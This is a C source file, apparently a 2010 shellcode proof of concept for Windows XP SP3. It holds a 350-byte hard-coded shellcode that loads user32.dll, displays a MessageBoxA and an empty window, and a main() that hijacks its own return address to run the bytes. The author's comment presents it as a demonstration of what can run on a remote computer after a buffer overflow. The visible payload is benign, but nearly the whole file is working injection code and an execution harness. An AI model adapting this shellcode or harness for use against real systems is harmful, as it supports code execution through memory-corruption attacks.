/*
  Win32/XP SP3 English
  Author : Jean D'Elboux Diogo - (jyzuz)
  Date: 18/oct/2010
  Description : It's a 350 bytes shellcode that displays a MessageBoxA
  and an empty windows form. This is just an example of how to build a
  program on a remote computer when exploiting a buffer. This proves that
  we can do much more than launching calc.exe or cmd.exe ;)
  There is only one null byte (left for fun :), and the address to the
  Windows API are all hard coded, because I just want to prove my idea,
  so this is just a *VERY* simple and *UGLY* example.
  Also I didn't added the code to close the application to let the code
  smaller. So even if you click on the close button the process will keep
  running, until you manually kill the process.
*/


unsigned char shellcode[] = 
    "\x55\x8b\xec\x33\xc0\x33\xdb\x33\xc9\x33\xd2\x51\x68\x6c\x6c\x20"
    "\x20\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x8b\xcc\xbb\x7b\x1d"
    "\x80\x7c\x51\xff\xd3\xbb\x59\x22\x51\x11\x81\xeb\x11\x01\x11\x11"
    "\xff\xe3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x59\x33\xc0\x50"
    "\x51\x8d\x49\x09\x51\x50\xb9\xea\x07\x45\x7e\xff\xd1\x83\xec\x60"
    "\x33\xff\xbe\x33\x32\x2e\x64\x81\xee\x33\x32\xee\x63\x57\x68\x44"
    "\x44\x44\x44\x8b\xdc\x52\xba\xba\x39\xbb\xba\x81\xea\xba\xba\xba"
    "\xba\x52\x57\xba\x3e\xd3\x42\x7e\xff\xd2\x5a\x66\xb9\x41\x11\x66"
    "\x81\xe9\x11\x11\x89\x4d\xa0\x50\x33\xc0\x40\x40\x40\x89\x45\xa4"
    "\x58\xba\xa4\x67\x74\x12\x81\xea\x78\x46\x34\x12\x89\x55\xa8\x89"
    "\x7d\xac\x89\x7d\xb0\x89\x75\xb4\x89\x7d\xb8\x89\x45\xbc\x33\xd2"
    "\xb2\x10\x89\x55\xc0\x89\x7d\xc4\x89\x65\xc8\x89\x7d\xcc\x8d\x45"
    "\xa0\x52\x50\xba\x39\x7c\x42\x7e\xff\xd2\x5a\xb9\xda\xda\xda\x70"
    "\x81\xe9\xda\xda\xda\xf0\x57\x56\x57\x57\xbf\x1f\xcc\xca\xda\x81"
    "\xef\xff\xca\xca\xda\x57\x57\x33\xff\x57\x51\xbf\x01\x12\xe0\x11"
    "\x81\xef\x11\x11\x11\x11\x57\x33\xff\x53\x53\x57\xba\xa9\xe4\x42"
    "\x7e\xff\xd2\x6a\x01\x50\x68\x56\xaf\x42\x7e\x5a\xff\xd2\x8d\x5d"
    "\xd0\x53\x68\xb8\x96\x41\x7e\x5a\xff\xd2\x57\x57\x57\x53\x68\x2b"
    "\x77\x42\x7e\x5a\xff\xd2\x84\xc0\x75\xe7\xc9\xc3\x55\x8b\xec\x83"
    "\x7d\x0c\x02\xff\x75\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08\xba"
    "\x7e\xc1\x42\x7e\xff\xd2\xc9\xc3\xe8\xe5\xfe\xff\xff\x41\x41\x41"
    "\x41\x41\x41\x41\x41\x00\x44\x44\x44\x44\x44\x44\x44\x44";

int main()
{
    int *ret;
    ret = (int*)&ret + 2;
    *ret=shellcode;
}

